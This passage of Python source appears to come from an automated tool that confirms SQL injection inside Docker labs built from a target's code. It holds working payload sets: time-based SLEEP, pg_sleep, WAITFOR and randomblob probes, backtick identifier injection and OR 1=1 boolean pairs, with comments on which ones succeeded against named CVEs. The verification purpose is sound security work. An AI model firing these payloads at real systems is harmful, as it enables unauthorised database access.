                          f"filtre de verdad las URLs internas antes de seguirlas)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


# SLEEP() (MySQL/MariaDB/SQLite con create_function propio), pg_sleep() (PostgreSQL) -- el motor
# real no se puede saber sin leer el codigo, asi que se prueban los dos dialectos en vez de
# asumir uno. Si el motor real no tiene ninguno de los dos, el payload simplemente no ejecuta
# nada y la peticion tarda lo normal (no es un falso positivo).
_SQLI_SLEEP_SECONDS = 4.0
_SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
# SQLite no tiene SLEEP(). Forzamos I/O con HEX(randomblob(N)) -- genera N bytes de datos
# aleatorios en memoria y los convierte a hex; con 50 MB tarda ~2-3s en un contenedor Docker
# moderno (confirmado empiricamente), lo que supera el threshold de SQLI_SLEEP_SECONDS/2.
# Se pega directamente como expresion de valor en el contexto AND (igual que SLEEP()).
_SQLI_SQLITE_TIMING_EXPR = "HEX(randomblob(50000000))"
# _LEGACY_SQLI_CONTEXTS en joomlaverify.py probo en vivo (CVE-2025-40636, mod_vvisit_counter
# 2.0.4j3: WHERE ip=UNHEX(SHA1('$ip')), payload ganador real necesito exactamente DOS parentesis
# de cierre) que el SQL real nido con frecuencia el valor contaminado dentro de llamadas a
# funcion, no solo un simple WHERE col='$val'. Ese mismo gap aplicaba aqui: esta lista solo
# cerraba UN nivel de parentesis -- se amplia con las mismas variantes de DOS y TRES niveles ya
# probadas, para ambos estilos de comilla.
_SQLI_CONTEXTS = ("", "'", "')", "'))", "')))", '"', '")', '"))', '")))')
_SQLI_COMMENTS = ("-- -", "#")
# Confirmado en vivo contra CVE-2026-9469 (StudentManagementSystem /success.php, `user` ->
# "SELECT * FROM admin WHERE user='$user' AND password='$hash'"): el bucle de abajo SOLO
# probaba "<val> AND <sleep>", que requiere que <val> YA machee una fila real -- en un
# formulario de login probado con un usuario que no existe (el caso MAS comun, nadie conoce ya
# una cuenta valida de antemano), MySQL cortocircuita el AND por fila sin llegar a evaluar
# SLEEP() nunca, y el payload no retrasa nada aunque la inyeccion sea real (confirmado: 0.0s en
# 45/45 combinaciones AND contra el admin real). "OR <sleep>" si fuerza la evaluacion sin
# necesitar fila que machee, pero SLEEP() en bruto dentro de un OR se evalua UNA VEZ POR FILA
# escaneada (no cortocircuita, porque SLEEP() siempre devuelve 0/falso) -- confirmado en vivo:
# contra la tabla `admin` real (6 filas), "OR SLEEP(4)" tardo ~24s (6 x 4s), no ~4s, y ese
# retraso crece con el tamano de la tabla sin limite, arriesgando superar el timeout de la
# peticion (_SQLI_SLEEP_SECONDS + 15s) en tablas mas grandes. Envolver el SLEEP en una subquery
# derivada sin correlacion ("SELECT 1 FROM (SELECT SLEEP(n)) x") la fuerza a materializarse UNA
# SOLA VEZ por ejecucion de consulta en vez de una vez por fila -- confirmado en vivo: mismo
# "OR" contra la misma tabla de 6 filas, ~4.0s en vez de ~24s. Se usa solo para "OR" (donde la
# multiplicacion es real); "AND" sigue con el SLEEP() en bruto que 09e1daf ya probo en vivo.
_SQLI_BOOLEAN_OPS = ("AND", "OR")


def _sqli_sleep_clause(op: str, sleep_expr: str) -> str:
    if op == "OR":
        return f"(SELECT 1 FROM (SELECT {sleep_expr}) binoracle_sqli_sleep)"
    return sleep_expr


def _screenshot_browser_navigate(url: str) -> Optional[str]:
    """Abre la URL en un navegador Chromium headless real y toma una captura visual de la pagina
    tal como la renderiza el navegador (captura tipo 'web', distinta de _screenshot_response que
    muestra el visor HTTP). Devuelve PNG en base64, o None si Playwright no esta disponible."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import concurrent.futures as _cf
    import tempfile

    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)

    def _do() -> Optional[str]:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                page = browser.new_context(
                    viewport={"width": 1280, "height": 800},
                    device_scale_factor=2,
                ).new_page()
                page.goto(url, wait_until="domcontentloaded", timeout=12000)
                page.screenshot(path=out_path)
                try:
                    page.close(run_before_unload=False)
                except Exception:
                    pass
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")

    try:
        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
            return executor.submit(_do).result(timeout=30)
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _add_exploit_evidence(res: "WpVerifyResult", method: str, url: str,
                          resp_or_body, highlight: str,
                          caption_es: str, caption_en: str,
                          extra_terminal: str = "") -> None:
    """Helper universal: tras confirmar la explotacion, captura screenshot HTTP + http_capture.
    Llama a _screenshot_response (Playwright), almacena en res.evidence independientemente de
    si Playwright esta disponible (el http_capture siempre se guarda)."""
    if isinstance(resp_or_body, str):
        status = 200
        body = resp_or_body[:6000]
        req_body_str = ""
        req_headers: dict = {}
        resp_headers: dict = {}
        reason = ""
    else:
        status = getattr(resp_or_body, 'status_code', 200)
        body = (getattr(resp_or_body, 'text', '') or '')[:6000]
        reason = getattr(resp_or_body, 'reason', '') or ''
        req_obj = getattr(resp_or_body, 'request', None)
        raw_body = getattr(req_obj, 'body', None) if req_obj else None
        req_body_str = ""
        if isinstance(raw_body, bytes):
            req_body_str = raw_body.decode('utf-8', errors='replace')[:2000]
        elif isinstance(raw_body, str):
            req_body_str = raw_body[:2000]
        raw_hdrs = dict(getattr(req_obj, 'headers', {}) or {}) if req_obj else {}
        req_headers = {k: v for k, v in raw_hdrs.items()
                       if k.lower() not in ('cookie', 'authorization')}
        resp_headers = {k: v for k, v in dict(getattr(resp_or_body, 'headers', {}) or {}).items()
                        if k.lower() not in ('set-cookie',)}

    # Always store structured http_capture (no Playwright needed)
    res.evidence.setdefault("http_captures", []).append({
        "caption_es": caption_es,
        "caption_en": caption_en,
        "method": method.upper(),
        "url": url,
        "request_headers": req_headers,
        "request_body": req_body_str,
        "response_status": status,
        "response_reason": reason,
        "response_headers": resp_headers,
        "response_body": body[:3000],
        "highlight": highlight,
    })

    # Try Playwright screenshot
    try:
        _png = _screenshot_response(url, method.upper(), status, body, highlight=highlight)
        if _png:
            res.evidence.setdefault("screenshots", []).append({
                "png_b64": _png,
                "url": url,
                "caption_es": caption_es,
                "caption_en": caption_en,
            })
    except Exception:
        pass

    # Optional terminal screenshot (for canary-type verification)
    if extra_terminal:
        try:
            _tpng = _screenshot_terminal_step(
                "binoracle · explotacion confirmada", extra_terminal,
                highlight=highlight,
            )
            if _tpng:
                res.evidence.setdefault("screenshots", []).append({
                    "png_b64": _tpng,
                    "url": "",
                    "caption_es": caption_es + " (evidencia terminal)",
                    "caption_en": caption_en + " (terminal evidence)",
                })
        except Exception:
            pass


def _take_generic_screenshots_sqli(
    base_url: str, endpoint_path: str, m: str, base_params: dict,
    sqli_param: str, evidence: dict,
) -> List[dict]:
    """Captura screenshots Playwright del lab generico para SQLi: control, payload, false (boolean)."""
    import urllib.parse
    shots: List[dict] = []
    http_captures: List[dict] = []
    estrategia = evidence.get("estrategia", "tiempo")
    payload_ganador = evidence.get("payload_ganador", "")
    orig_value = str(base_params.get(sqli_param) or "1")

    def _do_shot(params: dict, step_n: int, caption_es: str, caption_en: str,
                 highlight: str = "", timeout: int = 20) -> None:
        try:
            resp = _http_request(m, base_url + endpoint_path, timeout=timeout,
                                 data=params if m != "GET" else None,
                                 params=params if m == "GET" else None,
                                 headers=custom_headers or None)
            body = getattr(resp, "text", "") or ""
            status = getattr(resp, "status_code", 200)
            url_disp = base_url + endpoint_path
            if m == "GET":
                url_disp += "?" + urllib.parse.urlencode(params)
            png = _screenshot_response(url_disp, m, status, body, highlight=highlight)
            if png:
                shots.append({"step": step_n, "caption_es": caption_es,
                               "caption_en": caption_en, "png_b64": png})
            # Captura HTTP estructurada (Burp-style)
            req_obj = getattr(resp, 'request', None)
            req_body_raw = getattr(req_obj, 'body', None) if req_obj else None
            req_body_str = ""
            if isinstance(req_body_raw, bytes):
                req_body_str = req_body_raw.decode('utf-8', errors='replace')[:2000]
            elif isinstance(req_body_raw, str):
                req_body_str = req_body_raw[:2000]
            raw_hdrs = dict(getattr(req_obj, 'headers', {}) or {}) if req_obj else {}
            req_headers = {k: v for k, v in raw_hdrs.items()
                           if k.lower() not in ('cookie', 'authorization')}
            resp_hdrs = {k: v for k, v in dict(getattr(resp, 'headers', {}) or {}).items()
                         if k.lower() not in ('set-cookie',)}
            http_captures.append({
                "caption_es": caption_es,
                "caption_en": caption_en,
                "method": m,
                "url": url_disp,
                "request_headers": req_headers,
                "request_body": req_body_str,
                "response_status": status,
                "response_reason": getattr(resp, 'reason', '') or '',
                "response_headers": resp_hdrs,
                "response_body": body[:3000],
                "highlight": highlight,
            })
        except Exception:
            pass

    _do_shot({**base_params, sqli_param: orig_value}, 1,
             f"Control: {m} {endpoint_path} sin inyección → respuesta base del servidor",
             f"Control: {m} {endpoint_path} without injection → baseline server response")

    if payload_ganador:
        if estrategia == "boolean-inband":
            cap_es = (f"Payload boolean TRUE: {sqli_param}={payload_ganador!r} → "
                      f"{evidence.get('respuesta_true_len', '?')}B (inyección confirmada)")
            cap_en = (f"Boolean TRUE payload: {sqli_param}={payload_ganador!r} → "
                      f"{evidence.get('respuesta_true_len', '?')}B (injection confirmed)")
        else:
            cap_es = (f"Payload SQLi ciega: {sqli_param}={payload_ganador!r} → "
                      "respuesta retrasada (tiempo confirma inyección)")
            cap_en = (f"Blind SQLi payload: {sqli_param}={payload_ganador!r} → "
                      "delayed response (time-based injection confirmed)")
        _do_shot({**base_params, sqli_param: payload_ganador}, 2,
                 cap_es, cap_en, highlight=payload_ganador[:80])

    if estrategia == "boolean-inband" and evidence.get("payload_false"):
        pf = evidence["payload_false"]
        _do_shot({**base_params, sqli_param: pf}, 3,
                 (f"Payload boolean FALSE: {sqli_param}={pf!r} → "
                  f"{evidence.get('respuesta_false_len', '?')}B (contraste con payload TRUE)"),
                 (f"Boolean FALSE payload: {sqli_param}={pf!r} → "
                  f"{evidence.get('respuesta_false_len', '?')}B (contrast with TRUE payload)"))

    # Web screenshot — navegador real apuntando al servidor del lab (complementa los shots
    # de visor HTTP con una vista tal como la renderiza Chromium)
    step_web = len(shots) + 1
    try:
        web_url = base_url + endpoint_path
        # GET: añadir payload ganador en la URL para que el navegador muestre la respuesta
        if m == "GET" and payload_ganador:
            web_url += "?" + urllib.parse.urlencode({**base_params, sqli_param: payload_ganador})
        web_png = _screenshot_browser_navigate(web_url)
        if web_png:
            shots.append({
                "step": step_web,
                "caption_es": (f"Vista web real: Chromium renderiza {endpoint_path} "
                               f"— servidor vivo en {base_url}"),
                "caption_en": (f"Real web view: Chromium renders {endpoint_path} "
                               f"— live server at {base_url}"),
                "png_b64": web_png,
            })
    except Exception:
        pass
    return shots, http_captures


def _take_generic_screenshots_bypass(
    base_url: str, endpoint: str, m: str,
    bypass_header: str, bypass_value: str,
    status_normal: int, body_normal: str,
    status_bypass: int, body_bypass: str,
) -> tuple:
    """Captura screenshots Playwright del lab generico para header bypass.
    Devuelve (shots, http_captures)."""
    shots: List[dict] = []
    http_captures: List[dict] = []
    url = base_url + endpoint

    for step_n, status, body, caption_es, caption_en, hl, extra_hdrs in [
        (1, status_normal, body_normal,
         f"Sin header de bypass → HTTP {status_normal} (middleware bloquea el acceso)",
         f"Without bypass header → HTTP {status_normal} (middleware blocks access)",
         "", {}),
        (2, status_bypass, body_bypass,
         f"CON {bypass_header}: {bypass_value[:60]!r} → HTTP {status_bypass} (acceso conseguido)",
         f"WITH {bypass_header}: {bypass_value[:60]!r} → HTTP {status_bypass} (access gained)",
         bypass_value[:80], {bypass_header: bypass_value}),
    ]:
        try:
            png = _screenshot_response(url, m, status, body, highlight=hl)
            if png:
                shots.append({"step": step_n, "caption_es": caption_es,
                               "caption_en": caption_en, "png_b64": png})
        except Exception:
            pass
        http_captures.append({
            "caption_es": caption_es,
            "caption_en": caption_en,
            "method": m,
            "url": url,
            "request_headers": extra_hdrs,
            "request_body": "",
            "response_status": status,
            "response_reason": "",
            "response_headers": {},
            "response_body": body[:3000],
            "highlight": hl,
        })

    # Web screenshot — navegador real apuntando al endpoint (vista complementaria al visor HTTP)
    try:
        web_png = _screenshot_browser_navigate(url)
        if web_png:
            shots.append({
                "step": len(shots) + 1,
                "caption_es": (f"Vista web real: Chromium renderiza {endpoint} "
                               f"tras el bypass — servidor vivo en {url.split(endpoint)[0]}"),
                "caption_en": (f"Real web view: Chromium renders {endpoint} "
                               f"after bypass — live server at {url.split(endpoint)[0]}"),
                "png_b64": web_png,
            })
    except Exception:
        pass
    return shots, http_captures


def verify_generic_sqli_blind(
    source_dir: str, endpoint: str, http_method: str, parameters,
    sqli_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    sqli_identifier_table_hint: str = "",
    custom_headers: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
    Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
    ser MySQL/Postgres/SQLite/MSSQL/Mongo...), el error-based (extractvalue/updatexml, sintaxis
    de MySQL) y el UNION-based (depende del numero de columnas Y de que el motor soporte UNION
    igual) no generalizan sin arriesgar falsos positivos/negativos por motor equivocado -- el
    retraso de una funcion SLEEP es la unica senal que vale casi igual en cualquier SQL.

    sqli_identifier_table_hint: si se conoce el nombre real de la tabla (y la clausula GROUP BY),
    activa la estrategia de inyeccion backtick-FROM: se rompe el identificador de columna con
    una comilla invertida y se sustituye el FROM original por una subquery que incluye SLEEP en
    el WHERE -- e.g. `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 GROUP BY col-- -`
    Con esto se puede verificar SQLi en contextos de identifiers MySQL (Django annotate(), etc.)
    donde los payloads estandar de tipo 'valor' AND/OR SLEEP fallan por contexto sintatctico.

    Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
    de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
    produce un retraso consistente (>= la mitad del SLEEP pedido) en las 2 repeticiones
    independientes de la MISMA peticion, no en una sola medida que podria ser ruido.

    Prueba AMBOS combinadores booleanos (AND y OR, ver _SQLI_BOOLEAN_OPS) -- "AND <sleep>" solo
    retrasa si el valor original YA machea una fila real (CMS-especificos como wpverify suelen
    saberlo de antemano por el login), pero un formulario generico probado sin credenciales
    validas nunca la machea, y MySQL cortocircuita el AND por fila sin llegar a evaluar SLEEP()
    -- confirmado en vivo contra CVE-2026-9469. "OR <sleep>" no necesita fila que machee, pero
    SLEEP() en bruto dentro de un OR se evalua una vez POR FILA escaneada (el retraso crece con
    el tamano de la tabla); se envuelve en una subquery derivada sin correlacion para forzar una
    sola evaluacion por consulta, no por fila (ver _sqli_sleep_clause)."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' o pasalo a mano (sqli_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   setup_commands=setup_commands)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        # Strip the query string from the endpoint: params are always passed separately as a
        # dict via 'params=' in GET requests. If the endpoint includes '?k=<placeholder>' (a
        # common LLM output pattern), appending it to base_url while ALSO passing the same key
        # via params= would create duplicate query params -- Flask/Django returns the first one
        # (the literal placeholder), not the injected payload.
        endpoint_path = endpoint.split("?")[0] if endpoint and "?" in endpoint else endpoint
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
        orig_value = str(base_params.get(sqli_param) or "1")

        def timed_send(val, capture_body: bool = False) -> Optional[float]:
            payload = dict(base_params)
            payload[sqli_param] = val
            t0 = time.time()
            try:
                resp = _http_request(m, base_url + endpoint_path, timeout=_SQLI_SLEEP_SECONDS + 15,
                                 data=payload if m != "GET" else None,
                                 params=payload if m == "GET" else None,
                                 headers=custom_headers or None)
            except Exception:
                return None
            elapsed = time.time() - t0
            if capture_body and "respuesta_control_recorte" not in res.evidence:
                # recorte de la respuesta de CONTROL (sin inyeccion) -- la unica evidencia real
                # (ademas de los tiempos) que esta tecnica puede capturar, ya que el oraculo es
                # puramente temporal; sirve igual para que el bucle de aprendizaje-y-reintento
                # del LLM detecte un endpoint/parametro equivocado (p.ej. un 404 propio).
                res.evidence["respuesta_control_recorte"] = (getattr(resp, "text", "") or "")[:500]
            return elapsed

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "sqli_param": sqli_param})

        step("midiendo tiempos de respuesta de control (sin inyeccion)...")
        base_times = [t for t in (timed_send(orig_value, capture_body=True),
                                  timed_send(orig_value)) if t is not None]
        if not base_times:
            res.detail = "las peticiones de control fallaron (sin tiempo base con el que comparar)"
            return res
        base_times.sort()
        base_median = base_times[len(base_times) // 2]
        res.evidence["tiempo_base_mediana_s"] = round(base_median, 2)

        threshold = base_median + (_SQLI_SLEEP_SECONDS / 2)
        tried = []
        found = False
        for ctx in _SQLI_CONTEXTS:
            if found:
                break
            for sleep_expr in _SQLI_SLEEP_EXPRS:
                if found:
                    break
                for op in _SQLI_BOOLEAN_OPS:
                    if found:
                        break
                    clause = _sqli_sleep_clause(op, sleep_expr)
                    for cm in _SQLI_COMMENTS:
                        payload_val = f"{orig_value}{ctx} {op} {clause}{cm}"
                        step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
                        t1 = timed_send(payload_val)
                        t2 = timed_send(payload_val)
                        entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                                 "tiempo_2_s": round(t2, 2) if t2 else None}
                        tried.append(entry)
                        if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                            found = True
                            res.evidence["payload_ganador"] = payload_val
                            res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                            res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                            step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
                                 f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
                                 f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
                                 f"por tiempo, no ruido de red/Docker.")
                            break

        # MSSQL: WAITFOR DELAY es una INSTRUCCION, no una funcion que valga dentro de un AND/OR --
        # necesita una query APILADA (';' cierra el SELECT original y abre una nueva). Casuistica
        # real de SQL Injection/Intruder/Generic_TimeBased.txt en PayloadsAllTheThings. Se prueba
        # aparte porque su forma no encaja en el bucle de arriba (SLEEP()/pg_sleep() si valen
        # dentro de una condicion AND/OR).
        if not found:
            waitfor_secs = f"0:0:{_SQLI_SLEEP_SECONDS:.0f}"
            for ctx in _SQLI_CONTEXTS:
                if found:
                    break
                payload_val = f"{orig_value}{ctx};WAITFOR DELAY '{waitfor_secs}'--"
                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (MSSQL WAITFOR, "
                     f"time-based)...")
                t1 = timed_send(payload_val)
                t2 = timed_send(payload_val)
                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                         "tiempo_2_s": round(t2, 2) if t2 else None}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador"] = payload_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                    step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
                         f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")

        # SQLITE timing (no SLEEP/pg_sleep): HEX(randomblob(N)) fuerza la CPU a generar
        # y convertir a hex N bytes de datos aleatorios, provocando un retraso medible.
        # Con 50 MB (~100 MB de hex) el retraso es ~1-3s en un contenedor Docker estandar
        # (confirmado empiricamente). Solo se intenta si los SLEEP/pg_sleep ya fallaron.
        if not found:
            _sqlite_threshold = base_median + 1.0  # umbral mas bajo: 1s suficiente para randomblob
            for ctx in _SQLI_CONTEXTS:
                if found:
                    break
                for cm in _SQLI_COMMENTS:
                    # AND: solo ejecuta randomblob si la condicion anterior es True
                    _pl = f"{orig_value}{ctx} AND (SELECT CASE WHEN ({_SQLI_SQLITE_TIMING_EXPR}>'') THEN 1 ELSE 0 END)=1{cm}"
                    step(f"probando {m} {endpoint} con {sqli_param}={_pl!r} (SQLite randomblob timing)...")
                    t1 = timed_send(_pl)
                    t2 = timed_send(_pl)
                    entry = {"payload": _pl, "tiempo_1_s": round(t1, 2) if t1 else None,
                             "tiempo_2_s": round(t2, 2) if t2 else None,
                             "estrategia": "sqlite-randomblob"}
                    tried.append(entry)
                    if t1 is not None and t2 is not None and t1 >= _sqlite_threshold and t2 >= _sqlite_threshold:
                        found = True
                        res.evidence["payload_ganador"] = _pl
                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                        res.evidence["estrategia"] = "sqlite-randomblob-timing"
                        step(f"VERIFICADO (SQLite randomblob): {sqli_param}={_pl!r} retraso la "
                             f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE -- SQLi ciega "
                             f"por tiempo en SQLite confirmada.")
                        break

        # MYSQL BACKTICK IDENTIFIER FROM-INJECTION (time-based via SLEEP en WHERE):
        # Cuando el parametro vulnerable se usa como ALIAS de columna en MySQL (Django annotate(),
        # raw SQL AS `{col}`, etc.), los payloads estandar de tipo 'valor' AND/OR SLEEP no
        # funcionan porque el contexto sintactico de AS <identifier> solo acepta un identificador
        # simple -- cualquier operador despues del identificador es un error de sintaxis.
        # Estrategia: romper el backtick para cerrar el identifier early, luego substituir el
        # FROM original por uno que incluya SLEEP en el WHERE:
        #   col = x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}-- -
        # Genera: ... AS `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}
        # La subquery en el WHERE fuerza la evaluacion de SLEEP antes de la resolucion de
        # columnas (MySQL evalua el WHERE por fila ANTES del GROUP BY / HAVING). Requiere
        # conocer el nombre real de la tabla (sqli_identifier_table_hint).
        if not found and sqli_identifier_table_hint:
            # Parse hint: "table_name GROUP BY col" or "table_name WHERE cond GROUP BY col"
            # We need to inject SLEEP in the WHERE clause BEFORE GROUP BY.
            # Normalize: extract table name and groupby clause (if any).
            _hint_upper = sqli_identifier_table_hint.upper()
            if " GROUP BY" in _hint_upper:
                _split_idx = _hint_upper.index(" GROUP BY")
                _table_part = sqli_identifier_table_hint[:_split_idx].strip()
                _groupby_part = " " + sqli_identifier_table_hint[_split_idx:].strip()
            else:
                _table_part = sqli_identifier_table_hint.strip()
                _groupby_part = ""
            step(f"probando inyeccion backtick-FROM (MySQL identifier) en {sqli_param}="
                 f"<valor>`` FROM {_table_part}... "
                 f"(SQLi en contexto de alias de columna)...")
            for sleep_expr in _SQLI_SLEEP_EXPRS:
                if found:
                    break
                payload_val = (f"{orig_value}`"
                               f" FROM {_table_part}"
                               f" WHERE (SELECT {sleep_expr} FROM DUAL)=0"
                               f"{_groupby_part}-- -")
                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} "
                     f"(backtick-FROM time-based)...")
                t1 = timed_send(payload_val)
                t2 = timed_send(payload_val)
                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                         "tiempo_2_s": round(t2, 2) if t2 else None,
                         "estrategia": "backtick-FROM"}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador"] = payload_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                    res.evidence["estrategia"] = "backtick-FROM-injection"
                    step(f"VERIFICADO (backtick-FROM): {sqli_param}={payload_val!r} retraso la "
                         f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE en 2 repeticiones "
                         f"-- SQLi de identifier MySQL (alias de columna) confirmada.")
                    break

        # MYSQL BACKTICK IDENTIFIER ERROR-BASED DETECTION (fallback):
        # Si todos los payloads de tiempo fallan pero el parametro podria ser un identifier MySQL
        # (backtick-quoting), un backtick literal en el valor causa un error de sintaxis SQL que
        # cambia el codigo HTTP de 200 a 5xx. Este cambio diferencial prueba que la entrada
        # del usuario llega sin sanitizar a un contexto SQL de identifier -- prueba mas debil que
        # el time-based pero real. Se confirma verificando que el cuerpo de la respuesta de error
        # contiene palabras clave de error MySQL ("SQL syntax", "1064", "mysql") para descartar
        # errores de validacion propios de la aplicacion.
        if not found:
            step(f"probando deteccion error-based backtick para {sqli_param} "
                 f"(MySQL identifier context, diferencial HTTP 2xx vs 5xx)...")
            payload_backtick = f"{orig_value}`"
            resp_bt = None
            try:
                payload_bt_dict = dict(base_params)
                payload_bt_dict[sqli_param] = payload_backtick
                resp_bt = _http_request(m, base_url + endpoint_path, timeout=15,
                                        data=payload_bt_dict if m != "GET" else None,
                                        params=payload_bt_dict if m == "GET" else None)
            except Exception:
                pass
            if resp_bt is not None:
                status_bt = getattr(resp_bt, "status_code", 0)
                body_bt = (getattr(resp_bt, "text", "") or "")[:1000]
                sql_error_markers = ("SQL syntax", "1064", "mysql", "syntax error",
                                     "near", "1054", "unknown column", "OperationalError")
                has_sql_error = any(m_kw.lower() in body_bt.lower() for m_kw in sql_error_markers)
                # Solo marca como verificado si el codigo de control era 2xx Y la respuesta
                # de inyeccion es 4xx/5xx Y el cuerpo contiene marcadores de error SQL
                # (no un error de validacion propio de la app como "invalid input").
                ctrl_resp = None
                try:
                    ctrl_dict = dict(base_params)
                    ctrl_resp = _http_request(m, base_url + endpoint_path, timeout=10,
                                              data=ctrl_dict if m != "GET" else None,
                                              params=ctrl_dict if m == "GET" else None)
                except Exception:
                    pass
                ctrl_status = getattr(ctrl_resp, "status_code", 0) if ctrl_resp else 0
                if ctrl_status in range(200, 300) and status_bt >= 400 and has_sql_error:
                    found = True
                    res.evidence["payload_ganador"] = payload_backtick
                    res.evidence["backtick_control_status"] = ctrl_status
                    res.evidence["backtick_error_status"] = status_bt
                    res.evidence["backtick_error_body_recorte"] = body_bt[:300]
                    res.evidence["estrategia"] = "backtick-identifier-error-based"
                    step(f"VERIFICADO (backtick error-based): {sqli_param}={payload_backtick!r} "
                         f"cambio el codigo HTTP de {ctrl_status} a {status_bt} con error SQL "
                         f"en el cuerpo -- input no sanitizado llega al contexto SQL de identifier "
                         f"MySQL (backtick-quoting).")
                else:
                    step(f"backtick error-based: status_control={ctrl_status}, "
                         f"status_bt={status_bt}, has_sql_error={has_sql_error} -- "
                         f"no se confirmo inyeccion de identifier.")

        # IN-BAND BOOLEAN SQLi fallback: cuando el motor no soporta SLEEP/pg_sleep/randomblob
        # (p.ej. SQLite) pero la respuesta REFLEJA los datos de la consulta (como str(fetchall())),
        # podemos comparar la respuesta "true" (OR 1=1) con la baseline "false" (OR 1=2).
        # Si la respuesta "true" es notablemente mas grande que la "false", hay inyeccion.
        # Esta tecnica es un ultimo recurso para labs con SQLite + app que devuelve los datos.
        # Incluye patrones de inyeccion de conector (CVE-2025-64459 Django _connector): cuando el
        # parametro ES el conector SQL (no un valor), el bypass es el parametro completo 'OR 1=1'.
        if not found:
            _bool_payloads = [
                (f"{orig_value}' OR '1'='1",  f"{orig_value}' OR '1'='2"),   # string context
                (f"{orig_value}' OR 1=1-- -",  f"{orig_value}' OR 1=2-- -"), # comment
                (f"{orig_value} OR 1=1-- -",   f"{orig_value} OR 1=2-- -"),  # numeric
                ("OR 1=1",                      "AND 1=0"),                   # conector SQL completo
                ("OR 1=1-- -",                  "AND 1=2-- -"),               # conector con comentario
            ]
            for _true_pl, _false_pl in _bool_payloads:
                if found:
                    break
                try:
                    _true_d = dict(base_params); _true_d[sqli_param] = _true_pl
                    _false_d = dict(base_params); _false_d[sqli_param] = _false_pl
                    _resp_t = _http_request(m, base_url + endpoint_path, timeout=15,
                                            data=_true_d if m != "GET" else None,
                                            params=_true_d if m == "GET" else None)
                    _resp_f = _http_request(m, base_url + endpoint_path, timeout=15,
                                            data=_false_d if m != "GET" else None,
                                            params=_false_d if m == "GET" else None)
                except Exception:
                    continue
                _st = getattr(_resp_t, "status_code", 0)
                _sf = getattr(_resp_f, "status_code", 0)
                _bt = getattr(_resp_t, "text", "") or ""
                _bf = getattr(_resp_f, "text", "") or ""
                # "true" debe: (a) devolver 2xx, (b) tener MAS datos que "false",
                # (c) el cuerpo "false" NO debe contener los mismos datos extra (es decir,
                # no es que siempre devuelva lo mismo sin importar el valor).
                _size_diff = len(_bt) - len(_bf)
                step(f"probando boolean in-band: size_true={len(_bt)}, size_false={len(_bf)}, "
                     f"diff={_size_diff} (true={_true_pl!r})")
                if (_st in range(200, 300) and _sf in range(200, 300)
